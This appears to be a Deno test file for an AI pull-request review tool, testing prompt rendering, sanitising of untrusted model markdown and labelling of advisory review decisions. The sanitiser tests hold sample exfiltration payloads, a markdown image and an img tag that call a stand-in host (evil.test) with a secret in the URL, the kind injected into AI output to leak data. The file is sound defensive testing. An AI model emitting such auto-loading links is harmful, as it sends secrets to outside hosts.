import { deepEqual as assertEquals, throws as assertThrows } from "node:assert/strict";
import { renderPrompt } from "./prompt.ts";
import { reviewBody } from "./messages.ts";
import { sanitizeMarkdown } from "./sanitize.ts";

const variables = {
  repository: "marimo-team/marimo",
  number: 7,
  headSha: "a".repeat(40),
  headDir: "pr-head",
  contextDir: "_agent_review/context",
};

Deno.test("renders prompt variables and appends repository guidance", () => {
  const prompt = renderPrompt("Review #{{number}} in {{headDir}}.", variables, "Check the kernel.");
  assertEquals(prompt.startsWith("Review #7 in pr-head."), true);
  assertEquals(prompt.trimEnd().endsWith("Check the kernel."), true);
  assertEquals(renderPrompt("x", variables, "  \n"), "x");
  assertThrows(() => renderPrompt("{{missing}}", variables, undefined));
});

Deno.test("sanitizes untrusted model markdown", () => {
  assertEquals(
    sanitizeMarkdown("see ![x](https://evil.test/?d=secret)"),
    "see [x](https://evil.test/?d=secret)",
  );
  assertEquals(sanitizeMarkdown('a<img src="https://evil.test">b'), "ab");
  assertEquals(sanitizeMarkdown("cc @octocat"), "cc @\u200boctocat");
  assertEquals(sanitizeMarkdown("`List<String>` and a && b"), "`List<String>` and a && b");
});

Deno.test("review body distinguishes proposed from enforced decisions", () => {
  const result = {
    outcome: "completed" as const,
    summary: "s",
    coverage: "c",
    limitations: [],
    findings: [],
  };
  const run = {
    harness: "claude" as const,
    requester: "maintainer",
    runUrl: "https://x",
    headSha: "a".repeat(40),
  };
  const options = { run, result, unanchored: [], notes: [] };
  const verdict = { kind: "comment" as const, reasons: ["Changes `![x](https://evil.test)`."] };

  const advisory = reviewBody({ ...options, verdict, event: "COMMENT", authority: "advisory" });
  assertEquals(advisory.includes("**Decision: Comment**"), true);
  assertEquals(advisory.includes("https://evil.test") && !advisory.includes("!["), true);

  const proposed = reviewBody({
    ...options,
    verdict: { kind: "approve" },
    event: "COMMENT",
    authority: "advisory",
  });
  assertEquals(proposed.includes("**Proposed decision: Approve** (not enforced"), true);
});
